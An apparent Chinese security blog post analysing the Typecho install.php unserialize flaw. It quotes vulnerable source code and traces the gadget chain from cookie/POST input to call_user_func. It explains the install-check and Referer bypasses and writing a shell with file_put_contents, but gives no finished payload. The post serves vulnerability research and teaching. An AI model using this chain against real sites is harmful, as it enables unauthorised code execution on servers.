<p>&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>./install.php</code> &#x3002;&#x662F;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;&#x7684;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x524D;&#x53F0; getshell&#x3002;</p>
<p>&#x53D7;&#x5F71;&#x54CD;&#x7248;&#x672C;&#xFF1A;GitHub&#x4E0A;2017&#x5E74;10&#x6708;24&#x65E5;&#x4E4B;&#x524D;&#x7684;&#x6240;&#x6709;&#x7248;&#x672C;&#x3002;</p>
<h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2><p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>./install.php</code>&#x3002;&#x5B9A;&#x4F4D;&#x654F;&#x611F;&#x51FD;&#x6570; <code>unserialize</code>&#x3002;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x5B9A;&#x4F4D;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x6709;&#x5173;&#x5229;&#x7528;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x5B9E;&#x53EA;&#x6709;&#x7B2C;&#x4E00;&#x5904;&#x80FD;&#x591F;&#x5229;&#x7528;&#x3002;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x5728; 231-237&#x884C;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&apos;__typecho_config&apos;</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="hljs-string">&apos;__typecho_config&apos;</span>);</span><br><span class="line">$db = <span class="hljs-keyword">new</span> Typecho_Db($config[<span class="hljs-string">&apos;adapter&apos;</span>], $config[<span class="hljs-string">&apos;prefix&apos;</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br></pre></td></tr></tbody></table></figure><br>&#x5BFB;&#x627E;<code>unserialize</code>&#x51FD;&#x6570;&#x4E2D;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x53EF;&#x63A7;&#x3002;&#x53EF;&#x89C1;&#x5148;&#x7ECF;&#x8FC7;&#x4E00;&#x6B21; <code>base64_decode</code> &#x51FD;&#x6570;&#x89E3;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#x7684;&#x662F; <code>Typecho_Cookie</code> &#x7C7B;&#x4E0B;&#x7684;<code>get</code>&#x65B9;&#x6CD5;&#x3002;<p></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    $key = <span class="hljs-keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="hljs-keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="hljs-keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="hljs-keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x70B9;&#x5728; <code>value</code> &#x9644;&#x503C;&#x5904;&#x3002;&#x53EF;&#x89C1;&#x8BBE;&#x5B9A;&#x4E86;&#x4E24;&#x4E2A;&#x4E09;&#x5143;&#x8FD0;&#x7B97;&#x7B26;&#x8FDB;&#x884C;&#x5D4C;&#x5957;, &#x901A;&#x8FC7; <code>$_COOKIE</code> &#x548C; <code>$_POST</code> &#x5BF9;&#x5176;&#x9644;&#x503C;&#x3002;&#x53EF;&#x89C1;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7; POST &#x65B9;&#x6CD5;&#x6765;&#x63A7;&#x5236; key &#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x4ECE;&#x800C;&#x63A7;&#x5236; value &#x3002;</p>
<p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x62E5;&#x6709;&#x4E86;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x70B9;(<code>unserialize</code>),&#x548C;&#x6211;&#x4EEC;&#x7684;&#x53EF;&#x63A7;&#x53D8;&#x91CF;&#xFF08;<code>$_POST</code> &#x5BF9;<code>__typecho_config</code> &#x9644;&#x503C;&#xFF09;&#x3002;</p>
<p>&#x601D;&#x8003;&#xFF1A;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5F97;&#x5230;&#x4E86;&#x4EC0;&#x4E48;&#xFF1F;<br>&#x2014;&#x2014;&#x300B; <code>$config</code>&#x53D8;&#x91CF;&#x7684;&#x53EF;&#x63A7;&#x6027;&#x3002;</p>
<p>&#x7D27;&#x63A5;&#x7740;&#x4F53;&#x73B0; <code>$config</code> &#x53D8;&#x91CF;&#x53EF;&#x63A7;&#x6027;&#x7684;&#x5730;&#x65B9;&#x5728; <code>$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</code>&#x3002; &#x7A0B;&#x5E8F;&#x901A;&#x8FC7; <code>Typecho_Db</code> &#x8FDB;&#x884C;&#x4E86;&#x5B9E;&#x4F8B;&#x5316;&#x3002;&#x8DDF;&#x8FDB;&#x65B9;&#x6CD5;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Db</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($adapterName, $prefix = <span class="hljs-string">&apos;typecho_&apos;</span>)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-comment">/** &#x83B7;&#x53D6;&#x9002;&#x914D;&#x5668;&#x540D;&#x79F0; */</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">/** &#x6570;&#x636E;&#x5E93;&#x9002;&#x914D;&#x5668; */</span></span><br><span class="line">        $adapterName = <span class="hljs-string">&apos;Typecho_Db_Adapter_&apos;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (!call_user_func(<span class="hljs-keyword">array</span>($adapterName, <span class="hljs-string">&apos;isAvailable&apos;</span>))) {</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Typecho_Db_Exception(<span class="hljs-string">&quot;Adapter {$adapterName} is not available&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">/** &#x521D;&#x59CB;&#x5316;&#x5185;&#x90E8;&#x53D8;&#x91CF; */</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_pool = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_connectedPool = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_config = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//&#x5B9E;&#x4F8B;&#x5316;&#x9002;&#x914D;&#x5668;&#x5BF9;&#x8C61;</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_adapter = <span class="hljs-keyword">new</span> $adapterName();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x4EE3;&#x7801;&#x4E3A; <code>$adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;</code>&#xFF0C; &#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x62FC;&#x63A5;&#x3002;&#x4E14; <code>adapterName</code> &#x662F;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;PHP&#x5C31;&#x4F1A;&#x505A;&#x4E00;&#x4E2A;&#x4ECE;&#x7C7B;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5F3A;&#x5236;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x3002;&#x7531;&#x6B64;&#x4F1A;&#x89E6;&#x53D1;&#x90A3;&#x4E2A;&#x7C7B;&#x7684; <code>toString</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x76EE;&#x524D;&#x7684;&#x5229;&#x7528;&#x94FE;&#x4E3A;: <code>install.php</code> &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;<code>$config</code> &#x53D8;&#x91CF;&#x53EF;&#x63A7; &#x2014;&#x2014;&gt; <code>Cookie.php</code> &#x4E2D;<code>.</code>&#x62FC;&#x63A5;&#x5BFC;&#x81F4;&#x5F3A;&#x5236;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7C7B; <code>__tostring</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5C31;&#x5F00;&#x59CB;&#x5BFB;&#x627E;&#x6211;&#x4EEC;&#x53EF;&#x5229;&#x7528;&#x7684; <code>tostring</code> &#x65B9;&#x6CD5;&#x3002;&#x4E00;&#x5171;&#x4E09;&#x5904;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x53EA;&#x6709; <code>var/Typecho/Feed.php</code> &#x4E00;&#x5904;&#x3002;&#x622A;&#x53D6;&#x90E8;&#x5206;&#x4EE3;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $_items = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">     * $item&#x7684;&#x683C;&#x5F0F;&#x4E3A;</span></span><br><span class="line"><span class="hljs-comment">     * &lt;code&gt;</span></span><br><span class="line"><span class="hljs-comment">     * array (</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;title&apos;      =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;content&apos;    =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;excerpt&apos;    =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;date&apos;       =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;link&apos;       =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;author&apos;     =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;comments&apos;   =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;commentsUrl&apos;=&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;commentsFeedUrl&apos; =&gt; &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     * )</span></span><br><span class="line"><span class="hljs-comment">     * &lt;/code&gt;</span></span><br><span class="line"><span class="hljs-comment">     *</span></span><br><span class="line"><span class="hljs-comment">     * <span class="hljs-doctag">@access</span> public</span></span><br><span class="line"><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $item</span></span><br><span class="line"><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> unknown</span></span><br><span class="line"><span class="hljs-comment">     */</span></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span><span class="hljs-params">(array $item)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># ~ ~ ~ ~ ~ ~ &#x7701;&#x7565;&#x90E8;&#x5206;&#x4EE3;&#x7801;</span></span><br><span class="line">    </span><br><span class="line">               <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_items <span class="hljs-keyword">as</span> $item) {</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;item&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;title&gt;&apos;</span> . htmlspecialchars($item[<span class="hljs-string">&apos;title&apos;</span>]) . <span class="hljs-string">&apos;&lt;/title&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;link&gt;&apos;</span> . $item[<span class="hljs-string">&apos;link&apos;</span>] . <span class="hljs-string">&apos;&lt;/link&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;guid&gt;&apos;</span> . $item[<span class="hljs-string">&apos;link&apos;</span>] . <span class="hljs-string">&apos;&lt;/guid&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;pubDate&gt;&apos;</span> . <span class="hljs-keyword">$this</span>-&gt;dateFormat($item[<span class="hljs-string">&apos;date&apos;</span>]) . <span class="hljs-string">&apos;&lt;/pubDate&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;dc:creator&gt;&apos;</span> . htmlspecialchars($item[<span class="hljs-string">&apos;author&apos;</span>]-&gt;screenName) . <span class="hljs-string">&apos;&lt;/dc:creator&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x70B9;&#x5728; 290&#x884C;&#xFF0C; <code>$content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL;</code> &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x63A7; <code>$item[&apos;author&apos;]</code>&#x3002;&#x5F53;&#x4ED6;&#x88AB;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x4E14;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;<code>screenName</code>&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528; <code>__get</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x76EE;&#x524D;&#x7684;&#x5229;&#x7528;&#x94FE;&#x4E3A;: <code>install.php</code> &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;<code>$config</code> &#x53D8;&#x91CF;&#x53EF;&#x63A7; &#x2014;&#x2014;&gt; <code>Cookie.php</code> &#x4E2D;<code>.</code>&#x62FC;&#x63A5;&#x5BFC;&#x81F4;&#x5F3A;&#x5236;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7C7B; <code>__tostring</code> &#x65B9;&#x6CD5;&#x3002;&#x2014;&#x2014;&gt; <code>Feed.php</code> &#x4E2D;&#x63A7;&#x5236; <code>$item[&apos;author&apos;]</code> &#x53BB;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7C7B;&#x7684; <code>__get</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x5BFB;&#x627E; <code>__get</code> &#x65B9;&#x6CD5;&#x3002;&#x627E;&#x5230;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x6587;&#x4EF6; <code>Request.php</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($key)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x8DDF;&#x8FDB;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x7684; <code>get</code> &#x51FD;&#x6570;<p></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">true</span>) {</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">                $value = <span class="hljs-keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">                $value = <span class="hljs-keyword">self</span>::$_httpParams[$key];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="hljs-number">0</span> ? $value : $default;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E; <code>return</code> &#x8FD4;&#x56DE;&#x503C;&#x7ECF;&#x8FC7;&#x4E86; <code>_applyFilter</code> &#x5904;&#x7406;&#xFF0C;&#x8DDF;&#x8FDB; <code>_applyFilter</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_applyFilter</span><span class="hljs-params">($value)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_filter) {</span><br><span class="line">            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_filter <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">                call_user_func($filter, $value);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;_filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><br>&#x53D1;&#x73B0;&#x654F;&#x611F;&#x51FD;&#x6570;: <code>call_user_func</code> &#x3002;&#x4E14; <code>$filter</code>&#x901A;&#x8FC7; <code>private $_filter = array();</code> +  <code>foreach ($this-&gt;_filter as $filter)</code> &#x5F97;&#x5230;&#xFF0C;<code>$filter</code>&#x53EF;&#x63A7;&#x3002;<code>$value</code> &#x901A;&#x8FC7; <code>_params[$key]</code>&#x95F4;&#x63A5;&#x5F97;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x662F;&#x53EF;&#x63A7;&#x7684;&#x3002;<p></p>
<p>&#x7531;&#x6B64;&#x5B8C;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684;POP&#x94FE;</p>
<p>&#x4F46;&#x5728;&#x5230;&#x8FBE;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x70B9;&#xFF08;<code>unserialize</code>&#x51FD;&#x6570;&#xFF09;&#x4E4B;&#x524D;&#xFF0C;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x4E86;&#x4E24;&#x4E2A;&#x9650;&#x5236;&#x3002;&#x5927;&#x6982;&#x529F;&#x80FD;&#x5728;&#x6CE8;&#x91CA;&#x4E2D;&#x4E5F;&#x5199;&#x7684;&#x6E05;&#x695A;&#x660E;&#x4E86;&#x4E86;&#x3002;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">//&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;finish&apos;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="hljs-string">&apos;/config.inc.php&apos;</span>) &amp;&amp; <span class="hljs-keyword">empty</span>($_SESSION[<span class="hljs-string">&apos;typecho&apos;</span>])) {</span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x6321;&#x6389;&#x53EF;&#x80FD;&#x7684;&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_GET) || !<span class="hljs-keyword">empty</span>($_POST)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&apos;HTTP_REFERER&apos;</span>])) {</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="hljs-string">&apos;HTTP_REFERER&apos;</span>]);</span><br><span class="line">	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($parts[<span class="hljs-string">&apos;port&apos;</span>])) {</span><br><span class="line">        $parts[<span class="hljs-string">&apos;host&apos;</span>] = <span class="hljs-string">&quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($parts[<span class="hljs-string">&apos;host&apos;</span>]) || $_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>] != $parts[<span class="hljs-string">&apos;host&apos;</span>]) {</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x9488;&#x5BF9;&#x7B2C;&#x4E00;&#x70B9;: &#x901A;&#x8FC7;GET&#x4F20;&#x53C2; finish &#x5C31;&#x80FD;&#x7ED5;&#x8FC7;&#xFF1B; &#x9488;&#x5BF9;&#x7B2C;&#x4E8C;&#x70B9;&#xFF1A; refer&#x6765;&#x81EA;&#x672C;&#x7AD9;&#x5373;&#x53EF;<p></p>
<p>&#x6700;&#x540E;&#x6709;&#x4E00;&#x4E2A;&#x5751;&#x6765;&#x81EA;&#x4E8E; <code>install.php</code> &#x6700;&#x5F00;&#x5934;&#x7684; <code>ob_start();</code>&#x3002;</p>
<p>@LoRexxar&#x5E08;&#x5085;&#x63D0;&#x5230;</p>
<blockquote>
<p>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x4E0A;&#x9762;&#x5BF9;&#x8C61;&#x6CE8;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x89E6;&#x53D1;&#x4E86;&#x539F;&#x672C;&#x7684;<code>exception</code>&#xFF0C;&#x5BFC;&#x81F4;<code>ob_end_clean()</code>&#x6267;&#x884C;&#xFF0C;&#x539F;&#x672C;&#x7684;&#x8F93;&#x51FA;&#x4F1A;&#x5728;&#x7F13;&#x51B2;&#x533A;&#x88AB;&#x6E05;&#x7406;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x60F3;&#x4E00;&#x4E2A;&#x529E;&#x6CD5;&#x5F3A;&#x5236;&#x9000;&#x51FA;&#xFF0C;&#x4F7F;&#x5F97;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x5230;<code>exception</code>&#xFF0C;&#x8FD9;&#x6837;&#x539F;&#x672C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6570;&#x636E;&#x5C31;&#x4F1A;&#x88AB;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x529E;&#x6CD5;&#x3002; 1&#x3001;&#x56E0;&#x4E3A;<code>call_user_func</code>&#x51FD;&#x6570;&#x5904;&#x662F;&#x4E00;&#x4E2A;&#x5FAA;&#x73AF;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6570;&#x7EC4;&#x6765;&#x63A7;&#x5236;&#x7B2C;&#x4E8C;&#x6B21;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x627E;&#x4E00;&#x5904;<code>exit</code>&#x8DF3;&#x51FA;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5C31;&#x4F1A;&#x88AB;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002; 2&#x3001;&#x7B2C;&#x4E8C;&#x4E2A;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4E4B;&#x540E;&#xFF0C;&#x60F3;&#x529E;&#x6CD5;&#x9020;&#x6210;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#xFF0C;&#x8BED;&#x53E5;&#x62A5;&#x9519;&#x5C31;&#x4F1A;&#x5F3A;&#x5236;&#x505C;&#x6B62;&#xFF0C;&#x8FD9;&#x6837;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4ECD;&#x7136;&#x4F1A;&#x88AB;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002;</p>
</blockquote>
<p>&#x540C;&#x65F6; @pupiles &#x5E08;&#x5085;&#x4E5F;&#x5728;blog&#x4E2D;&#x6307;&#x51FA;&#xFF0C;&#x7531;&#x4E8E;&#x8C03;&#x7528;&#x4E86;<code>ob_end_clean</code>&#x65B9;&#x6CD5;&#x6E05;&#x7A7A;&#x4E86;&#x7F13;&#x51B2;&#x533A;&#x3002;&#x5BFC;&#x81F4;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x4F46;&#x662F;php&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7; <code>file_put_contents</code> &#x5199;&#x5165;shell</p>
<p>&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6574;&#x4E2A;&#x5229;&#x7528;ROP&#x94FE;&#x5C31;&#x6210;&#x7ACB;&#x4E86;</p>
